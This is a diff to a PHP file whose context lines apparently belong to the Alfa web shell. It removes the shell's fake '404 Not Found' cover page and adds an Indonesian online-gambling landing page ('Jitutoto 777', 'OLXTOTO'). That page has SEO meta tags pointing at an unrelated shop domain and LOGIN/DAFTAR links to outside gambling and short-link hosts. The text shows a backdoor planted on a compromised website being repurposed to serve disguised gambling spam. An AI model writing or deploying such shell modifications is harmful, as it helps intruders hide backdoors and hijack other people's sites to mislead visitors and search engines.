@@ -575,7 +575,359 @@ __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
-echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+echo " <title>Jitutoto 777 Hadir Dengan RTP Paling Tinggi Dan Terlengkap 2025</title>
+  <meta name='description' content='Jitutoto777 sudah lama di kenal sebagai bandar togel dan rtp slot yang mudah dengan deposit pulsa memberi kemudahan dalam bermain di jitutoto777' />
+  <meta name='keywords' content='Jitutoto 777'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=no' />
+  <meta name='aplus-auto-exp' content='[{'filter':'exp-tracking=suggest-official-store','logkey':'/lzdse.result.os_impr','props':['href'],'tag':'a'}]' />
+  <meta name='data-spm' content='a2o4j' />
+  <meta name='categories' content='product' />
+  <meta name='copyright' content='Jitutoto 777'>
+  <meta name='robots' content='index, follow'>
+  <meta name='rating' content='general'>
+  <meta name='geo.region' content='ID'>
+  <meta name='geo.country' content='ID'>
+  <meta name='language' content='Indonesia'>
+  <meta name='distribution' content='global'>
+  <meta name='author' content='Jitutoto 777'>
+  <meta name='publisher' content='Jitutoto 777'>
+  <meta property='og:site_name' content='Jitutoto 777'>
+  <meta name='og:url' content='https://tokoserverbandung.com/' />
+  <meta name='og:title' content='Jitutoto 777 Hadir Dengan RTP Paling Tinggi Dan Terlengkap 2025' />
+  <meta name='og:type' content='product' />
+  <meta name='og:description' content='Jitutoto777 sudah lama di kenal sebagai bandar togel dan rtp slot yang mudah dengan deposit pulsa memberi kemudahan dalam bermain di jitutoto777' />
+  <meta name='og:image' content='/jitutoto777.gif' /><link rel='canonical' href='https://tokoserverbandung.com/' />
+  <link rel='amphtml' href='https://tokoserverbandung.com/amp/' />
+      <style amp-boilerplate>
+        body {
+            -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        }
+
+        @-webkit-keyframes -amp-start {
+            from {
+                visibility: hidden;
+            }
+
+            to {
+                visibility: visible;
+            }
+        }
+
+        @-moz-keyframes -amp-start {
+            from {
+                visibility: hidden;
+            }
+
+            to {
+                visibility: visible;
+            }
+        }
+
+        @-ms-keyframes -amp-start {
+            from {
+                visibility: hidden;
+            }
+
+            to {
+                visibility: visible;
+            }
+        }
+
+        @-o-keyframes -amp-start {
+            from {
+                visibility: hidden;
+            }
+
+            to {
+                visibility: visible;
+            }
+        }
+
+        @keyframes -amp-start {
+            from {
+                visibility: hidden;
+            }
+
+            to {
+                visibility: visible;
+            }
+        }
+    </style>
+    <noscript>
+        <style amp-boilerplate>
+            body {
+                -webkit-animation: none;
+                -moz-animation: none;
+                -ms-animation: none;
+                animation: none;
+            }
+        </style>
+    </noscript>
+    <style amp-custom>
+        html {
+            background: #d11a1f url(https://olx.recamweek.com/OLXTOTO/background/bg-olx-baruu1.webp) center center no-repeat;
+            background-position: top;
+            background-size: 100%;
+            background-attachment: fixed;
+            background-attachment: fixed;
+            background-size: cover;
+        }
+
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 15px;
+            height: 100vh;
+        }
+
+
+        .wrap {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .profile {
+            text-align: center;
+            color: #FFF;
+        }
+
+        .photo {
+            width: 100%;
+            height: 500px;
+        }
+
+        .profile_name {
+            font-weight: bold;
+            display: block;
+        }
+
+        .at {
+            font-size: 13px;
+        }
+
+
+
+        .links ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .links ul li {
+            margin: 14px 0;
+        }
+
+        .link {
+            padding: 14px;
+            display: block;
+            background-color: #000000;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 4px;
+            transition: ease all 0.3s;
+            color: #FFF;
+            margin: 30px 0px;
+            border: 1px solid #fbff00;
+            animation: rainbow-border 4s linear infinite;
+            font-weight: bolder;
+            text-transform: uppercase;
+        }
+
+        .link:hover {
+            opacity: 0.9;
+            background: #00000070;
+        }
+
+        .card {
+            padding: 10px;
+            background-color: #FFF;
+            border-radius: 4px;
+        }
+
+        .card h3 {
+            margin: 0;
+            color: #202024;
+        }
+
+        .card p {
+            margin: 5px 0;
+            font-size: 13px;
+            color: #202024;
+        }
+
+
+        @keyframes rainbow-border {
+            0% {
+                border-image-slice: 1;
+                border-color: #ffd700;
+            }
+
+            14% {
+                border-color: #FFA500;
+            }
+
+            28% {
+                border-color: #ffd700;
+            }
+
+            42% {
+                border-color: #FFA500;
+            }
+
+            57% {
+                border-color: #FFFF00;
+            }
+
+            71% {
+                border-color: #ffd700;
+            }
+
+            85% {
+                border-color: #FFFF00;
+            }
+
+            100% {
+                border-image-slice: 1;
+                border-color: #ffd700;
+            }
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        a {
+            background: linear-gradient(to right, rgb(239 255 0), rgb(239 255 0)), linear-gradient(to right, rgb(239 255 0), rgb(239 255 0), rgb(200 185 0));
+            background-size: 100% 3px, 0 3px;
+            background-position: 100% 100%, 0 100%;
+            background-repeat: no-repeat;
+            transition: background-size 400ms;
+        }
+
+        a:hover {
+            background-size: 0 3px, 100% 3px;
+        }
+
+        a.link {
+            display: flex;
+            flex-direction: row;
+            align-content: center;
+            align-items: center;
+            justify-content: space-evenly;
+            fill: white;
+            font-size: 15px;
+            border-radius: 10px;
+        }
+
+        .profile amp-img {
+            border: 1px solid #fbff00;
+            animation: rainbow-border 4s linear infinite;
+        }
+
+        .bagidua {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            /* Membuat 2 kolom dengan lebar yang sama */
+            grid-gap: 20px;
+            /* Jarak antara kolom */
+        }
+
+        a.link:nth-child(2) {
+            font-size: small;
+        }
+
+        @media only screen and (max-width:600px) {
+            .wrap-pict {
+                width: 100%;
+            }
+
+            .photo {
+                width: 100%;
+                height: 300px;
+            }
+
+            .link {
+                padding: 14px;
+                display: block;
+                background-color: #ffd700;
+                text-align: center;
+                text-decoration: none;
+                border-radius: 4px;
+                transition: ease all 0.3s;
+                color: #FFF;
+                margin: 19px 0px;
+                border: 1px solid #fbff00;
+                animation: rainbow-border 4s linear infinite;
+                font-weight: bolder;
+                text-transform: uppercase;
+                margin-bottom: 15px;
+            }
+
+            a.link {
+                display: flex;
+                flex-direction: row;
+                align-content: center;
+                align-items: center;
+                justify-content: space-evenly;
+                fill: white;
+                font-size: 13px;
+                border-radius: 10px;
+            }
+
+        }
+    </style>
+</head>
+  <body>
+    <div class='wrap'>
+        <div class='links'>
+            <ul>
+                <li>
+                    <a href='https://www.elizabethspring.com/' target='_blank' class='link'>
+                        <amp-img width='50' height='50'
+                            src='https://imgstore.io/images/2025/02/20/photo_2025-02-05_13-36-58.jpeg'></amp-img>
+                        OLXTOTO # Login Link Alternatif Situs Resmi Anti Blokir Aman Jaya<svg xmlns='https://www.w3.org/2000/svg' width='30'
+                            height='30' viewBox='0 0 30 30'>
+                            <path
+                                d='M24.112 29.996c-3.304 0-5.892-2.577-5.892-5.866 0-.935.039-1.606.114-2.102l-7.543-3.934c-1.096 1.642-2.977 2.716-4.907 2.716-3.304 0-5.891-2.577-5.891-5.867 0-3.288 2.587-5.866 5.891-5.866 1.26 0 2.514.624 3.051.891.345.173.834.608 1.308 1.078l8.007-5.763c.285-3.005 2.757-5.28 5.862-5.28 3.304 0 5.892 2.576 5.892 5.865s-2.588 5.866-5.892 5.866c-1.636 0-3.155-.662-4.171-1.817a1.102 1.102 0 01.104-1.561 1.112 1.112 0 011.569.104c.584.664 1.518 1.061 2.498 1.061 2.058 0 3.67-1.604 3.67-3.653 0-2.048-1.612-3.652-3.67-3.652-2.056 0-3.669 1.604-3.669 3.652 0 .355-.17.689-.459.897l-9.225 6.641a1.115 1.115 0 01-1.472-.149c-.539-.586-1.18-1.204-1.371-1.322-.337-.167-1.296-.644-2.032-.644-2.058 0-3.67 1.604-3.67 3.652 0 2.049 1.612 3.653 3.67 3.653 1.588 0 2.946-1.239 3.412-2.403a1.11 1.11 0 01.648-.627c.295-.11.621-.088.901.057l9.337 4.87a1.103 1.103 0 01.401 1.607c-.041.143-.14.641-.14 2.03 0 2.048 1.613 3.652 3.669 3.652 2.058 0 3.67-1.604 3.67-3.652s-1.612-3.652-3.67-3.652c-.708 0-.874.067-1.391.325a1.12 1.12 0 01-1.494-.495 1.105 1.105 0 01.5-1.485c.79-.395 1.298-.559 2.385-.559 3.304 0 5.892 2.577 5.892 5.866 0 3.289-2.588 5.866-5.892 5.866z'
+                                fill=''></path>
+                        </svg>
+                    </a>
+                </li>
+
+            </ul>
+        </div>
+        <div class='profile'>
+
+            <div class='wrap-pict'>
+                <amp-img width='500' height='500' src='https://imgstore.io/images/2025/02/20/OLXTOTO--Login-Link-Alternatif-Situs-Resmi-Anti-Blokir-Aman-Jaya.jpeg' class='photo'
+                    alt='Deskripsi Gambar'></amp-img>
+            </div>
+        </div>
+        <div class='bagidua'>
+            <a href='https://surkale.me/Js1AWW/' target='_blank' class='link'>
+                LOGIN <svg xmlns='https://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 30 30'>
+                    <path
+                        d='M24.112 29.996c-3.304 0-5.892-2.577-5.892-5.866 0-.935.039-1.606.114-2.102l-7.543-3.934c-1.096 1.642-2.977 2.716-4.907 2.716-3.304 0-5.891-2.577-5.891-5.867 0-3.288 2.587-5.866 5.891-5.866 1.26 0 2.514.624 3.051.891.345.173.834.608 1.308 1.078l8.007-5.763c.285-3.005 2.757-5.28 5.862-5.28 3.304 0 5.892 2.576 5.892 5.865s-2.588 5.866-5.892 5.866c-1.636 0-3.155-.662-4.171-1.817a1.102 1.102 0 01.104-1.561 1.112 1.112 0 011.569.104c.584.664 1.518 1.061 2.498 1.061 2.058 0 3.67-1.604 3.67-3.653 0-2.048-1.612-3.652-3.67-3.652-2.056 0-3.669 1.604-3.669 3.652 0 .355-.17.689-.459.897l-9.225 6.641a1.115 1.115 0 01-1.472-.149c-.539-.586-1.18-1.204-1.371-1.322-.337-.167-1.296-.644-2.032-.644-2.058 0-3.67 1.604-3.67 3.652 0 2.049 1.612 3.653 3.67 3.653 1.588 0 2.946-1.239 3.412-2.403a1.11 1.11 0 01.648-.627c.295-.11.621-.088.901.057l9.337 4.87a1.103 1.103 0 01.401 1.607c-.041.143-.14.641-.14 2.03 0 2.048 1.613 3.652 3.669 3.652 2.058 0 3.67-1.604 3.67-3.652s-1.612-3.652-3.67-3.652c-.708 0-.874.067-1.391.325a1.12 1.12 0 01-1.494-.495 1.105 1.105 0 01.5-1.485c.79-.395 1.298-.559 2.385-.559 3.304 0 5.892 2.577 5.892 5.866 0 3.289-2.588 5.866-5.892 5.866z'
+                        fill=''></path>
+                </svg>
+            </a>
+            <a href='https://surkale.me/Js1AWW/' target='_blank' class='link'> DAFTAR<svg
+                    xmlns='https://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 30 30'>
+                    <path
+                        d='M24.112 29.996c-3.304 0-5.892-2.577-5.892-5.866 0-.935.039-1.606.114-2.102l-7.543-3.934c-1.096 1.642-2.977 2.716-4.907 2.716-3.304 0-5.891-2.577-5.891-5.867 0-3.288 2.587-5.866 5.891-5.866 1.26 0 2.514.624 3.051.891.345.173.834.608 1.308 1.078l8.007-5.763c.285-3.005 2.757-5.28 5.862-5.28 3.304 0 5.892 2.576 5.892 5.865s-2.588 5.866-5.892 5.866c-1.636 0-3.155-.662-4.171-1.817a1.102 1.102 0 01.104-1.561 1.112 1.112 0 011.569.104c.584.664 1.518 1.061 2.498 1.061 2.058 0 3.67-1.604 3.67-3.653 0-2.048-1.612-3.652-3.67-3.652-2.056 0-3.669 1.604-3.669 3.652 0 .355-.17.689-.459.897l-9.225 6.641a1.115 1.115 0 01-1.472-.149c-.539-.586-1.18-1.204-1.371-1.322-.337-.167-1.296-.644-2.032-.644-2.058 0-3.67 1.604-3.67 3.652 0 2.049 1.612 3.653 3.67 3.653 1.588 0 2.946-1.239 3.412-2.403a1.11 1.11 0 01.648-.627c.295-.11.621-.088.901.057l9.337 4.87a1.103 1.103 0 01.401 1.607c-.041.143-.14.641-.14 2.03 0 2.048 1.613 3.652 3.669 3.652 2.058 0 3.67-1.604 3.67-3.652s-1.612-3.652-3.67-3.652c-.708 0-.874.067-1.391.325a1.12 1.12 0 01-1.494-.495 1.105 1.105 0 01.5-1.485c.79-.395 1.298-.559 2.385-.559 3.304 0 5.892 2.577 5.892 5.866 0 3.289-2.588 5.866-5.892 5.866z'
+                        fill=''></path>
+                </svg>
+            </a>
+        </div>
+
+    </div>
+</body>
+  ".$SERVER_SIG."</body></html>".$Eform;
 exit;
 }
 }
